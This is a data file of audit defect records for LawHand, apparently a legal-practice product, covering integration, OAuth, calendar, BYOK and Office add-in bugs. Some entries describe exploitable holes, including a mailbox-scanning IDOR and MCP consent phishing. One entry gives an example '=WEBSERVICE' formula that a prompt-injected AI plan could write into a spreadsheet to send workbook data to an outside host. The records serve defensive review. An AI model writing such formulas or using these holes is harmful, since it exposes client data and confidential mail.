defect_batches.title: Onboarding 'Sync Users' button does not run a sync
defect_batches.claim: handleSyncUsers (OnboardingWizard.jsx:133-151) only persists step numbers (POST /admin/onboarding/step/{n} writes onboarding_step, onboarding.py:203-221) and advances to Review, relying on the post-connect background sync; if that failed the admin sees '0 users imported'.

defect_batches.title: Microsoft token-exchange failure is shown as a Google error; consent errors get a generic message
defect_batches.claim: OAUTH_ERROR_MESSAGES.token_exchange_failed says 'Google authorization could not be completed' (OnboardingWizard.jsx:35-39), but the Microsoft callback emits the same code (integrations.py:545); access_denied, consent_required, interaction_required, invalid_state and oauth_failed all fall back to one generic message (line 77), with no Global Administrator guidance.

defect_batches.title: Hub Teams pill and Teams panel use different sources and contradict each other
defect_batches.claim: The hub uses permissions.microsoft.capabilities.teams (IntegrationsHub.jsx:153-161), which depends on account_type that /admin/permissions does not backfill (admin.py:1648-1652 vs 322-324); TeamsPanel uses /integrations/status teams_connected (TeamsPanel.jsx:105-108), which backfills and honours TEAMS_FEATURE_ENABLED (integrations.py:1844-1865). Admins get contradictory states and a reconnect loop.

defect_batches.title: Destructive integration actions run without confirmation
defect_batches.claim: Storage migration 'Abandon' (StorageMigrationPanel.jsx:113-116, 140), Zoom/Zoom Phone 'Disconnect' and 'Clear tenant app' (ZoomPanel.jsx:108-119, 134-145, 164-176) and Cloud Search 'Invalidate Cache' (CloudSearchAdmin.jsx:328-352) act on one click, unlike QBOPanel.jsx:146-147.

defect_batches.title: Admin connect endpoints return raw JSON errors on top-level navigation
defect_batches.claim: The 501/428/403/400 responses in the Microsoft connect (integrations.py:431-448) and google_connect (664-687) endpoints are HTTPExceptions rendered as {"detail": ...}; the admin panel's Connect button is always enabled (IntegrationsPanel.jsx:760-769), unlike onboarding which disables it until agreements are ready (OnboardingWizard.jsx:411-412).

defect_batches.title: In-product and doc navigation points to locations that do not exist
defect_batches.claim: Wizard says 'Admin > Integrations > Cloud > Storage migration' (OnboardingWizard.jsx:538-540) but it is under Advanced and needs manage_integrations (IntegrationsHub.jsx:238-257); CloudSearchAdmin.jsx:95 says 'Settings > Integrations'; TeamsPanel.jsx:133 names an 'Integrations tab' without a link; docs describe missing Shared Drive/root-repair controls (21-onboarding-and-storage-setup.md:54,63) and send folder repair to SMB 'File Shares' (18-cloud-provider-support.md:97); the 'MCP Servers' button (UserMcpAccess.jsx:411-417) silently falls back to Overview without manage_integrations.

defect_batches.title: Cloud Search copy hard-codes a 15-minute sync interval
defect_batches.claim: CloudSearchAdmin.jsx:390 states 15 minutes, but the interval is CLOUD_METADATA_SYNC_INTERVAL_MIN and the job runs only if enabled (scheduler.py:804-809).

defect_batches.title: Re-authorize for Personal-Google tenants always fails and bounces the admin into onboarding
defect_batches.claim: IntegrationsPanel.handleReauthorize (IntegrationsPanel.jsx:174-181) calls /integrations/google/connect?intent=admin without account_mode; the backend defaults to 'workspace' (integrations.py:658-662) and requests the directory scope, and the callback rejects the personal account with account_mode_mismatch (integrations.py:798-800). _error_redirect then sends all admin errors to /onboarding (integrations.py:1790-1807). A solo/personal-Gmail firm with a revoked token cannot repair it from Admin > Cloud.

defect_batches.title: Microsoft 365 / Google disconnect is not exposed in the admin UI, does not revoke at the provider, and does not purge synced data
defect_batches.claim: POST /integrations/microsoft/disconnect and /google/disconnect exist (integrations.py:2105-2166) but api.js has no wrapper (api.js:798-835) and ProviderCard shows only Connect/Re-authorize (IntegrationsPanel.jsx:760-769). The endpoints delete tokens locally (token_vault.py:382-399) without revoking at Microsoft/Google, and leave Gmail subjects, snippets and participants in cloud_metadata_index. The legal notice (LegalNoticePage.jsx:58) and admin guide (04-integrations.md:85-91) promise an in-app disconnect, which Google Limited Use verification relies on.

defect_batches.title: Admin OAuth errors always land on /onboarding and the Cloud section never shows the connect result
defect_batches.claim: _error_redirect sends every admin-intent error to /onboarding?error=... even when onboarding is completed (integrations.py:1789-1807); on success the redirect to /admin?tab=integrations&integration=cloud&connected=<provider> is ignored because IntegrationsPanel never reads connected/error (IntegrationsPanel.jsx:145-158), unlike ZoomPanel.jsx:89-105 and CalendarPage.jsx:508-548. A completed tenant sees the error above 'Setup Complete!' (OnboardingWizard.jsx:73-77, 717), contradicting 04-integrations.md:47,51.

defect_batches.title: Saving a SharePoint library silently switches the primary storage provider
defect_batches.claim: SharePointBindingCard always sends is_primary: true (IntegrationsPanel.jsx:485-493); the backend sets primary_cloud_provider='sharepoint' (cloud_admin.py:397-405) and the panel updates the selector (IntegrationsPanel.jsx:338), bypassing PrimaryCloudSelector's confirmation (351-354). The binding is stored 'configured' with no write check, repointing all new matter writes without warning.

defect_batches.title: 'Granted by' never renders and the deactivated-grantor warning is never shown
defect_batches.claim: ProviderCard reads info.service_account_email (IntegrationsPanel.jsx:723-725) but GET /admin/permissions never returns it (admin.py:1706-1797; only the test fixture IntegrationsPanel.test.jsx:69 has it). The 'User X who granted consent is deactivated' warning exists only in /admin/integrations/health (admin.py:365-376), whose client getIntegrationsHealth (api.js:799-800) is never called. Admins cannot see who owns the firm grant before offboarding them.

defect_batches.title: Cloud Search reports Available/Connected/Enabled while the connection is broken
defect_batches.claim: The hub pill returns 'Available' for any cloud tone except 'off', including 'Needs attention' (IntegrationsHub.jsx:106-110). The Cloud Search status endpoint filters only is_active, not health, so revoked/refresh_failed credentials show 'Connected' (cloud_admin.py:170-176, 257-263), and it hard-codes enabled: True even in its error branch (219-238, 267-272); CloudSearchAdmin.jsx:52-57,73 ignores status:'error'.

defect_batches.title: Workflow-run MCP tool schemas use nested $defs/$ref that Copilot Studio drops
defect_batches.claim: WorkflowRunInput nests RunStepInput and SourceBinding lists (workflow_run_contract.py:85-94) and the tool schema is emitted directly from model_json_schema() (workspace_mcp_protocol.py:230-236), producing $defs/$ref and anyOf-null unions; Copilot Studio documents that reference-type inputs are filtered, so propose/resume_workflow_run may silently not appear.

defect_batches.title: MCP tool results carry relative links and internal file-server paths
defect_batches.claim: search_firm_memory returns unc_path, share_id and owner and a relative '/firm-memory?...' lawhand_url (chat_tools/handlers.py:246-261); source chips use relative '/api/documents/{id}/download' (396), contrary to docs/workspace_mcp_adapter.md:395. External assistants cannot deep-link and internal SMB topology leaks into third-party history.

defect_batches.title: communications:propose consent label omits SMS drafting
defect_batches.claim: The label 'Draft client email proposals without sending' (services/workspace_mcp_oauth.py:46) understates the scope, which also authorizes propose_client_sms (automation_capabilities.py:532-547).

defect_batches.title: AI request broker checks data class before resolving the route, skipping the BYOK fail-closed rule
defect_batches.claim: _enforce_policy calls route_matter_context_allowed without a route (ai_request_broker.py:255-272), then resolve_llm_route (317-321) may return the BYOK 'customer' route, which llm_routing.py:383-402 says must fail closed for confidential data. Affects flagged prospect-confidential after-call preparation (after_call_preparation.py:204-219); chat blocks the same case.

defect_batches.title: Workspace MCP OAuth supports only public clients, blocking Microsoft 365 Copilot and Gemini Enterprise
defect_batches.claim: AS metadata advertises token_endpoint_auth_methods_supported=['none'] (workspace_mcp_oauth.py:297); DCR rejects any other method and never returns a client_secret (313-404, esp. 350-363), and no admin/operator path creates a static confidential client (WorkspaceMCPClient is only created by DCR). Microsoft 365 Copilot MCP plugins require DCR that issues a secret and Gemini Enterprise requires client_id+client_secret, so ECO-09/12/21 are blocked; the ecosystem plan still lists this as existing leverage (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63).

defect_batches.title: Workspace MCP client registrations hard-expire after 30 days regardless of use
defect_batches.claim: WORKSPACE_MCP_CLIENT_REGISTRATION_DAYS=30 (config.py:444) and is_active requires expires_at > now (workspace_mcp_client.py:73-79); the token endpoint calls _active_client before refresh (workspace_mcp_oauth.py:704-705) and only updates last_used_at (806), never extending expiry, although grants last 90 days (config.py:443). Actively used connectors get invalid_client on day 31.

defect_batches.title: RFC 8707 resource parameter is mandatory at authorize and on every token grant including refresh
defect_batches.claim: resource: str = Query(...) (workspace_mcp_oauth.py:407-418) makes a missing resource a FastAPI 422 instead of an OAuth redirect error, and the token endpoint returns invalid_target when resource is absent for all grant types including refresh_token (706-708). Generic OAuth brokers (Teams Developer Portal, Power Platform, Gemini Enterprise) may not send it and fail at sign-in or first refresh.

defect_batches.title: Workspace MCP consent is all-or-nothing: one scope outside the user's role blocks the connection
defect_batches.claim: Consent is refused (403) unless every requested scope is in _allowed_user_scopes (workspace_mcp_oauth.py:487-495, 184-190; mapping 73-84), and the protected-resource challenge asks for all known scopes (workspace_mcp_protocol.py:144-150). A firm-wide Copilot/Gemini agent therefore fails for roles lacking manage_intake/manage_documents, with no indication which permission is missing.

defect_batches.title: MCP consent screen trusts a self-asserted client_name and admins cannot allowlist clients
defect_batches.claim: Any DCR client picks its client_name (workspace_mcp_oauth.py:365-372); the consent API returns only id and name (496-504) with no redirect host, publisher or verification, and WorkspaceMcpAuthorizePage.jsx:70 renders that name. The only controls are tenant/user on/off (workspace_mcp_access.py:31-43), contradicting docs/byo-harness-channel-contract.md:78-83. A registration named 'Microsoft 365 Copilot' can phish consent.

defect_batches.title: BYOK silently falls back to platform providers, and reconfiguring without the key erases it
defect_batches.claim: In llm_routing.py:540-573, decrypt failure or a missing key (bare except at 545-546) lets resolution continue to profile and platform routes. configure_customer_llm replaces customer_llm_config and keeps encrypted_api_key only if api_key is resent (admin.py:1557-1577) yet returns ok with use_customer_llm=true. This violates 'no platform fallback unless the firm explicitly authorizes one' (docs/standard-premium-byok-billing-plan-2026-08-16.md:212-213).

defect_batches.title: BYOK Azure endpoint is accepted without the /openai/v1 path and never connection-tested
defect_batches.claim: The byok_security normalizer (byok_security.py:67-73) keeps whatever path the admin supplied and LLMService points the plain OpenAI client at it (llm.py:272-275); the portal resource URL (https://x.openai.azure.com/) is accepted though OpenAI-SDK calls need /openai/v1/. No test at save time (admin.py:1536-1571), and llm_availability probes only gateway aliases (llm_availability.py:40-130). Admins can save a 'working' config where every AI call fails.

defect_batches.title: BYOK Gemini only supports a global AI Studio key with no paid-tier, region or Vertex controls
defect_batches.claim: The only Gemini option is the fixed generativelanguage.googleapis.com endpoint with an API key (byok_security.py:10-32); nothing checks the key belongs to a paid Cloud-Billing project, there is no regional/Vertex option, and the default model is hard-coded gemini-2.0-flash (llm_routing.py:555). A free-tier key can expose client content to provider training; residency-constrained firms cannot use their own Gemini.

defect_batches.title: 'copilot'/'gemini' BYOK path is mislabelled as a subscription and bypasses the LiteLLM gateway
defect_batches.claim: The admin endpoint says 'use their own LLM subscription (Gemini/Copilot)' (admin.py:1509-1521) but provider 'copilot' is an Azure OpenAI resource (byok_security.py:33-58; config.py:155 'Azure OpenAI (Copilot backend)'; tenant.py:221-226). The stored key bypasses the LiteLLM gateway (llm.py:261-275) and skips gateway accounting metadata (llm.py:351), contradicting TASKS.md:2622 (direct paths removed) and ECO-20 (TASKS.md:479-481) and the plan (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:55-57). AZURE_OPENAI_* and GEMINI_API_KEY settings are dead (config.py:156-161). Invites the misconception that a firm's M365 Copilot licence powers LawHand and escapes gateway approval/metering.

defect_batches.title: Microsoft admin connect omits openid, so tier stays 'unknown' and Entra directory sync is permanently blocked
defect_batches.claim: MICROSOFT_ADMIN_SCOPES (integrations.py:241-244) lacks openid/profile, so the admin callback (integrations.py:568-615) receives no id_token; claims is None, detect_microsoft(None) returns ('unknown', None), and apply_detection still stamps account_detected_at (account_detect.py:184-189), so backfill_unknown_credentials skips the row forever (account_detect.py:140-141). capabilities._directory_sync returns unavailable for an unknown tier (capabilities.py:98-103) and user_sync._directory_sync_blocked turns every Microsoft sync into not_applicable (user_sync.py:122-124). service_account_email is never set, so send_admin_notification never uses Graph (email_admin.py:106) and 'Granted by' is blank. Reconnecting cannot fix it; no test covers the MS admin callback token response.

defect_batches.title: Microsoft consent requests unused or over-broad scopes (Chat.ReadWrite, TeamsActivity.Send, per-user Files.ReadWrite.All, admin Mail.Read)
defect_batches.claim: Chat.ReadWrite and TeamsActivity.Send are required for teams_connected (teams.py:40-47; teams_gate.py:25-28), but nothing in backend/app calls /chats or sendActivityNotification and the Teams manifest has no activities block. Per-user Microsoft tokens are used only for reads (cloud_search, cloud_sync, document_sync), so Files.Read.All would suffice instead of Files.ReadWrite.All; admin Mail.Read only reaches the admin's own mailbox (feeding the mailbox-index leak); sign-in requests offline_access/User.Read and discards the tokens (auth.py:1324, 1372). Over-broad consent ('read and write all your chats', 'full access to all files') blocks law-firm security reviews.

defect_batches.title: Google scope sets exceed what the code uses (restricted Gmail, full Drive, full Calendar), including for the per-user 'Connect Calendar' grant
defect_batches.claim: All Google modes request gmail.readonly and full drive (restricted scopes needing annual CASA) plus full calendar (integrations.py:245-272). Code only touches calendars/primary/events (calendar.events suffices) and mostly app-created Drive files (drive.file suffices except drives.create and whole-Drive search/sync). The per-user grant (integrations.py:260-265) is launched from a 'Connect Calendar' button (api.js:2305-2307). GOOGLE_SOLO_SCOPES only drops directory, contrary to the 'least-privilege' claim (docs/onboarding-hotfix-review-2026-09-16.md:17). Consent abandonment and verification cost result.

defect_batches.title: Per-user Microsoft/Google connect has no identity or tenant/domain check
defect_batches.claim: The user-intent callbacks store whatever account completed consent: Microsoft uses the 'common' authority (config.py:108) with no openid, no /me lookup and no comparison to the user's Entra tid/oid or email domain (integrations.py:616-646); the Google user flow requests no openid/email so no id_token/hd is available (integrations.py:779-783). connected_mail then sends approved client correspondence from whichever account was connected (connected_mail.py:350-379), so privileged mail can go out from and be captured from a personal @gmail.com/Outlook.com account.

defect_batches.title: Capability matrix hard-codes email/calendar/cloud_storage 'ok' regardless of granted scopes
defect_batches.claim: capabilities.resolve() returns ok for email, calendar and cloud_storage irrespective of scopes (capabilities.py:158-175, esp. 169-171), even when Mail.Send, Calendars.ReadWrite, Files.ReadWrite.All or Google's granularly-declined Gmail/Drive scopes are missing. The scope gap is stored (integration_observability.py:42-56) but per-user rows with missing_scopes are counted needs_reauth forever (integration_observability.py:81); feature calls 403 and return [] with only a warning (e.g. cloud_search.py:678-687); there is no include_granted_scopes or incremental per-feature request. Admin UI shows 'Available' while features silently fail.

defect_batches.title: Plugin integration detection checks scopes LawHand never requests, so OneDrive/Google Drive never show as connected
defect_batches.claim: plugins.py:370-390 detects onedrive only for Files.Read.All and google_drive only for drive.readonly, but the connect flows request Files.ReadWrite.All and the full drive scope (integrations.py:241-259). Scope lists are hand-copied in four places (integrations.py:241-270, admin.py:1604-1622, plugins.py:370-389, integrations.py:2031-2035). Plugin cards (PluginsPage.jsx:88, PluginPage.jsx:159) omit OneDrive/Google Drive for fully connected firms.

defect_batches.title: Cancelled or blocked Microsoft/Google sign-in consent renders a raw FastAPI 422 JSON page
defect_batches.claim: microsoft_callback (auth.py:1338-1345) and google_callback (auth.py:1572-1579) declare code: str and state: str as required with no error parameter, so a provider redirect with ?error=access_denied/consent_required fails validation before the @_redirect_refusals_to_login wrapper (auth.py:1128-1142) runs; main.py has no RequestValidationError handler and loginErrors.js has no admin-consent message. The integrations callbacks handle error correctly (integrations.py:512-516).

defect_batches.title: /api/integrations/status reports Personal Google tenants as missing the directory scope
defect_batches.claim: google_required is always GOOGLE_ADMIN_SCOPES (integrations.py:1856) with no effective_required_scopes for the personal tier, so missing_scopes includes admin.directory and reconnect_required is true (1904-1921); /admin/permissions handles this correctly (admin.py:1702). Teams pages and future status consumers misreport healthy personal tenants.

defect_batches.title: Google domain-wide delegation is configuration-only and scope comments are misleading
defect_batches.claim: google_service_account.py:1-41 says DWD is used for directory and mail, but no caller passes subject and GOOGLE_IMPERSONATE_SUBJECT (config.py:175-178) is never read; DRIVE_SCOPES is described as 'least privilege' but is the full drive scope. Operators may configure DWD expecting it to work and reviewers may think scopes were minimized.

defect_batches.title: Moved or renamed matter key dates leave stale events on Outlook/Google calendars
defect_batches.claim: Key-date pushes (calendar_sync.py:519-628) store no provider event id and dedupe on (subject, start date) read back from the provider. When a key date moves or the matter is renamed, a new event is created and the old one is never updated or deleted, so lawyers see the old court date beside the new one (missed-deadline risk).

defect_batches.title: Date-only task events are sent to Google Calendar with an empty (end == start) range
defect_batches.claim: google_calendar.py:52-53 sends all-day events with end.date == start.date, but Google's end.date is exclusive, so the range is empty; the Graph path correctly adds one day (microsoft_calendar.py:83-96). The failure is only logged (google_calendar.py:159-166) inside fire-and-forget code (task_notifications.py:36-50), and the unit test encodes end == start. Most deadlines (no due time) never reach Google Calendar and nobody is told. Needs live-API confirmation.

defect_batches.title: Timed task events land at the wrong hour on Outlook and Google
defect_batches.claim: task_notifications.py:252-267 sends due_time in the matter's intake timezone (the client's) or UTC when there is no intake (matter_followups.py:29-44), while the LawHand calendar renders the same due_time as browser-local wall time (calendar.py:38-48); there is no firm or user timezone. A 2:00 PM deadline shows 2:00 PM in LawHand but 9:00 AM CDT in Outlook.

defect_batches.title: Key-date dedupe misses east of UTC+9 and beyond 100 events, creating duplicates on every sync
defect_batches.claim: Graph reads are normalized to UTC ('Prefer: outlook.timezone="UTC"', calendar_sync.py:100-122) and keyed on the UTC date [:10] (542-547) while events are created at 09:00 local (594); calendarView uses $top 100 with no @odata.nextLink, and Google uses maxResults 100 with no pageToken (344-350) over a 90-day window. Sydney/NZ firms and busy calendars get a new '[LawHand] ...' duplicate each sync.

defect_batches.title: Editing a scheduled event deletes and recreates it with the editor's token, re-inviting or orphaning
defect_batches.claim: Every PATCH (calendar.py:482-495) deletes and recreates the provider event using the editor's token rather than the creator's, the delete result is ignored (scheduled_events.py:125-142), and there is no creator/role check. Clients get a cancellation plus a new invite (and new Teams link) per edit; when another user edits or deletes, the original stays in the creator's calendar with the client still invited.

defect_batches.title: Google scheduled events never send invitations or cancellations (no sendUpdates), and cannot carry a Meet link
defect_batches.claim: events.insert (calendar_sync.py:446-498, esp. 485-493) and delete (512-516) are called without sendUpdates, which Google treats as 'none', so attendees receive neither invites nor cancellations; Graph sends invites by default (scheduled_events.py:66-92). There is also no conferenceData/hangoutsMeet option; meeting_provider allows only none/teams/zoom (schemas/calendar.py:101-106).

defect_batches.title: Background calendar pull hides provider token failures
defect_batches.claim: The 5-minute pullProviderChanges catches every error and does nothing (CalendarPage.jsx:610-624) and keeps no last-synced time, so stale Outlook/Google events remain with no warning after a token expires.

defect_batches.title: Directory sync re-activates admin-deactivated users, and their mailboxes keep being captured
defect_batches.claim: Every directory match sets user_row.is_active = True unconditionally (user_sync.py:175-181 for Microsoft, 321-327 for Google; also ms-graph#D7 at 170-173). Admin deactivation (admin.py:300-306) does not delete or revoke UserOAuthToken rows, and run_correspondence_capture iterates all token rows with no User.is_active or token-health filter (scheduler.py:1894-1916). A deactivated user is restored at the nightly directory sync and their mail is archived into matters every 30 minutes.

defect_batches.title: Directory sync never deprovisions disabled/suspended/deleted accounts and licenses guests and resource mailboxes
defect_batches.claim: Microsoft GET /users (user_sync.py:130-202) has no userType/assignedLicenses $filter and $select omits userType, so guests, rooms and shared mailboxes become role 'user' with license_active=True; accountEnabled=false only skips creation and never deactivates existing users (user_sync.py:154-156), and deleted users are never reconciled. The Google path (user_sync.py:305-351) skips suspended accounts instead of setting is_active=False, ignores deleted users, and creates every account license_active=True (346). Departed staff stay active and consume paid seats; external guests (clients/co-counsel in Teams) become licensed LawHand users. The Microsoft half is latent while the tier bug (ms-graph#D0) blocks MS sync, but live for Google and legacy MS credentials.

defect_batches.title: Manual directory sync result and failures are invisible to the admin
defect_batches.claim: The durable user_sync job raises without record_sync_failure and skips Google if Microsoft raises (durable_job_worker.py:405-434). The 'Sync now' UI uses a fixed 4 s timer and one shared syncing flag for both provider cards (IntegrationsPanel.jsx:114-126, 271-282), then silently reloads with no success/failure/count; errors go to a banner that never clears. The card keeps showing the last 'ok' sync after a failed run.

defect_batches.title: Consent copy and admin/user/setup docs omit Mail.Send/gmail.send and write-all-files access
defect_batches.claim: Code requests Mail.Send and Files.ReadWrite.All in Microsoft admin and user sets and gmail.send in Google admin/user/solo sets (integrations.py:241-272; connected_mail.py:44-45) and sends via /me/sendMail and messages/send. Yet the onboarding wizard says 'read mail, read files' (OnboardingWizard.jsx:420), the hub card says 'Mail and calendar access for enabled workflows' (IntegrationsHub.jsx:71-75), the admin data-visibility guide omits Mail.Send and says Gmail 'does not authorize sending' (16-integration-data-visibility.md:42, 60-62), docs/integrations-setup.md:42-53 lists no Mail.Send and 'Gmail read', docs/virtual-document-assistant-plan.md:544-545 says read-only, and the user transparency guide omits send (16-integration-transparency.md:39-47, 63-69; it also wrongly says documents are not copied locally at line 119 and links to missing chapters at 125-126). Customer security records and consent disclosures under-report send/write permission.

defect_batches.title: /api/email/scan lets any user scan another user's mailbox via body.user_id
defect_batches.claim: email_agent.py:31-65 sets user_id = str(user.id) if not body.user_id else body.user_id with no admin or ownership check; process_emails then loads that user's delegated mail token (email_agent.py:348-364). A paralegal can POST {user_id: partnerId} and receive the partner's inbox subjects, senders, AI summaries and drafted replies, and the scan writes notes/tasks attributed to the partner (IDOR).

defect_batches.title: Correspondence capture ignores CC, so mail where the party is only copied is never captured
defect_batches.claim: The Graph $select omits ccRecipients (microsoft_mail.py:43-48) and Gmail metadataHeaders are only From/To/Subject/Date (google_mail.py:187-194), while correspondence_capture._email_addresses reads 'cc' (correspondence_capture.py:87-94), which is always empty. Messages copying the client or opposing counsel are missed despite the rules UI promising 'emails involving the matter's parties'.

defect_batches.title: Correspondence capture reads a fixed 50-message/7-day window with no pagination or cursor
defect_batches.claim: Each run reads the top CORRESPONDENCE_CAPTURE_MAX_EMAILS=50 messages from the last 7 days (correspondence_capture.py:406-419; microsoft_mail.py:38-50; google_mail.py:169-180) with no paging and no persisted cursor. More than 50 messages per 30-minute interval, or an outage over 7 days, leaves permanent gaps in the matter file.

defect_batches.title: Email agent and correspondence capture block each other's dedupe and re-spend LLM calls
defect_batches.claim: The email agent writes CommunicationLog(matter_id, external_ref='provider:id') with no document (email_agent.py:57-91); capture's _already_captured (correspondence_capture.py:217-233, 263-269) then skips the message so no .eml is archived. In the other order capture blocks note/task-tag creation (email_agent.py:64-77). process_emails classifies and drafts before any dedupe (email_agent.py:366-394), so every scan re-bills LLM classification and premium drafts.

defect_batches.title: Outbound client emails are filed twice on the matter
defect_batches.claim: The compose log (matters.py:2807-2818) stores no external_ref: Graph sendMail returns 202 with no id (connected_mail.py:128-138) and the Gmail id is returned but discarded (connected_mail.py:192-199). A later scan captures the Sent Items copy under 'provider:id' (correspondence_capture.py:258-269), producing two log rows and two .eml files per email.

defect_batches.title: Staff aliases count as matter parties, so the alias owner's mail is filed into all their matters
defect_batches.claim: correspondence_capture.py:160-173 adds verified aliases of every assigned user to party_addresses, and any address overlap triggers capture (200-207). Every message to/from an attorney's verified alias is copied into each matter they are assigned to, placing privileged mail on other clients' files.

defect_batches.title: Revoked user tokens stay in the capture roster and are refreshed on every use
defect_batches.claim: _locked_user_token does not filter health='revoked' (token_vault.py:213-231), so each correspondence cycle, search and push retries refresh and logs a failure (scheduler.py:1896-1952), producing repeated failures rather than a single 'user must reconnect' state.

defect_batches.title: ms_read_mail_tenant is dead and broken
defect_batches.claim: microsoft_mail.py:101-134 passes the Graph user id as the LawHand user_id to get_fresh_user_token, so every user is skipped; there are no callers. A trap for anyone building tenant-wide capture on it.

defect_batches.title: Missing OFFICE_ENTRA_API_AUDIENCE produces a bogus '/office.access' scope and bypasses the not-configured guard
defect_batches.claim: docker-compose.hypervisor.yml:411 builds VITE_OFFICE_API_SCOPE as ${OFFICE_ENTRA_API_AUDIENCE:-}/office.access, never empty, bypassing the 'Office SSO is not configured' guard (officeSession.ts:40-42) and surfacing an opaque MSAL error.

defect_batches.title: Excel set_selected_values bypasses the unsafe-formula ban
defect_batches.claim: office_action_policy.py:168-183 checks set_selected_values only for JSON scalar type (53-57); the WEBSERVICE/HYPERLINK/external-reference regex (31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel interprets a value starting with '=' as a formula; validation.ts:99-102 does not check values either. A prompt-injected plan can write '=WEBSERVICE("https://x/?"&A1)' to exfiltrate workbook data.

defect_batches.title: Office add-in cookie session fails in Office on the web and new Outlook (SameSite=Lax in cross-site iframe)
defect_batches.claim: The Office token exchange sets HTTP-only cookies (auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60), then the pane re-reads /auth/me with credentials (office-addin/src/auth/officeSession.ts:72-99). As the code's own comment (officeSession.ts:73-77) notes, the Lax cookie is not sent cross-site; on web hosts the pane is iframed under office.com / cloud.microsoft, so the pane shows 'Office sign-in completed without a LawHand session'. Only classic desktop clients work.

defect_batches.title: Office add-in CSP frame-ancestors omits *.cloud.microsoft
defect_batches.claim: nginx/snippets/office_addin.conf:26 allows only *.office.com, *.office365.com, *.live.com and *.microsoft.com; Microsoft 365 web apps are moving to word/excel/outlook/m365.cloud.microsoft, and frame-ancestors checks every ancestor including the top-level page, so the task pane can be blocked in Office on the web / new Outlook.

defect_batches.title: Outlook read-mode button uploads the full message body and then always fails as read-only
defect_batches.claim: The manifest advertises 'Review Outlook messages' on read items (office-addin/manifests/outlook.xml:13, 29-31, 41-53); main.ts:43-46 enables Propose without checking capabilities.writeEnabled, and the server rejects the plan with 'This Office host is read-only' (office_action_policy.py:72-73) after up to 50k characters of client email body were uploaded.

defect_batches.title: Office add-in session expires after 30 minutes with no refresh or re-auth
defect_batches.claim: authenticated is set once at startup (office-addin/src/main.ts:188-197); OfficeApi.request throws on any non-OK response (office-addin/src/api/officeApi.ts:21-28) and never calls /auth/refresh or re-runs session.ensure, while ACCESS_TOKEN_EXPIRE_MINUTES=30 (config.py:42). A pane left open fails with 'Not authenticated' until reopened.

defect_batches.title: Word apply replaces the selection as plain text with no tracked changes
defect_batches.claim: wordAdapter.ts:99-103 uses insertText(..., replace), dropping mixed formatting, fields, cross-references and footnote references in the selection; WordApi 1.4 is detected (line 21) but changeTrackingMode is never enabled, so an AI rewrite in a negotiated draft leaves no redline.

defect_batches.title: Office add-in audit-failure status is wrong on reject and overwritten on apply
defect_batches.claim: report() always says 'The Office change completed, but LawHand could not record its audit result' (office-addin/src/main.ts:101), including after a Reject where nothing changed (154-165); on a successful apply, setStatus('Approved change applied.') at line 142 immediately overwrites the audit-failure message, so unaudited AI changes go unnoticed.

defect_batches.title: Office planner sends Word selection/Outlook body to the Standard LLM route without the data-class check
defect_batches.claim: office_assistant.create_plan (office_assistant.py:115-150) always resolves use_premium=False and sends up to 50k chars (schemas/office_assistant.py:44-67) without calling route_matter_context_allowed; Standard is public-general by default (llm_routing.py:354-370), while chat enforces the gate (chat.py:2421-2430). In pilot tenants confidential document/email text can reach a provider not cleared for client data.

defect_batches.title: Office plan usage is recorded at $0 because costing matches the gateway alias
defect_batches.claim: _usage_record prices route.model (office_assistant.py:75-85), a LiteLLM alias like 'lawhand-standard' (config.py:267); calculate_cost only matches claude/gemini/deepseek substrings and returns 0 with a warning (billing.py:60-66). Chat uses the provider-reported model (chat.py:2916). Office AI spend is invisible in usage and billing.

defect_batches.title: Word stale-check fingerprints only the selected text
defect_batches.claim: wordAdapter.ts:30-54 hashes the selected text (sha256) with no position or paragraph identity, so re-selecting identical boilerplate elsewhere applies the plan there without a stale warning.

defect_batches.title: Add-in limits are hard-coded; /api/office/policy and OFFICE_MAX_WORD_CHARACTERS are ignored
defect_batches.claim: Word/Excel limits are constants (wordAdapter.ts:13, excelAdapter.ts:13); /api/office/policy (routers/office_assistant.py:47-63) is never called, and the schema caps Word text at 50,000 regardless of OFFICE_MAX_WORD_CHARACTERS (schemas/office_assistant.py:46). Changed limits yield unexplained 422s or silently no effect.

defect_batches.title: Office exchange denies demo tenants that the plan endpoints allow
defect_batches.claim: The exchange calls require_office_pilot_tenant directly (auth.py:1777), while plans use require_office_for_user, which exempts billing_tier=='demo' (office_access.py:42-48). Sales demos cannot sign in unless also allowlisted.

defect_batches.title: Microsoft integration is hard-wired to the commercial cloud
defect_batches.claim: login.microsoftonline.com and graph.microsoft.com are hard-coded in 18 modules (e.g. storage_discovery.py:18, 30-32; cloud_folder_audit.py:140-145) and continuation-URL validators reject other hosts, so GCC High/DoD/21Vianet tenants cannot use LawHand.

defect_batches.title: Office add-in roadmap has no live TASKS entries; the only item refers to the removed word-addin prototype
defect_batches.claim: TASKS.md:958-959 still says 'Ship the Word add-in properly ... or archive it' though word-addin/ was replaced by office-addin/ (docs/office-document-assistant-plan.md:355); Office plan Slices 1-5 (259-306) and W2 Template Builder have no TASKS entries.

defect_batches.title: Integrations remediation plan status and migration references are wrong
defect_batches.claim: docs/integrations-remediation-plan.md:3 says 'Status: Proposed' though phases 0-2 are Done, and cites migrations 073/074 under migrations/versions (31, 179, 195) instead of backend/alembic/versions/082_integration_observability.py and 083_matter_doc_storage_meta.py.

defect_batches.title: Mojibake in customer-facing release notes for Workspace MCP entries
defect_batches.claim: 'ΓÇö'/'ΓÇÖ' appear 3 times in RELEASE_NOTES.md (1647, 1766, 1769) and 3 times in backend/app/release_notes.json, which feeds in-app 'What's new'.

defect_batches.title: Most Graph/Google call sites have no 429/Retry-After handling; syncs truncate silently and calendar pushes are lost
defect_batches.claim: Only provider_http.graph_request retries. Calendar (calendar_sync.py:124-141, google_calendar.py:100-166, microsoft_calendar.py:165-198), cloud sync (cloud_sync.py:343-372, 1058-1064), cloud_search, cloud_init, document_sync, directory (user_sync.py:130-145) and discovery (storage_discovery.py:214-250) use raw httpx and break or return empty on any non-200; task pushes are fire-and-forget with no durable retry. Throttled large firms get partial indexes and permanently stale calendar copies with no alert.

defect_batches.title: Google 403 rate-limit responses are treated as auth failures (no backoff, 'Reconnect' shown)
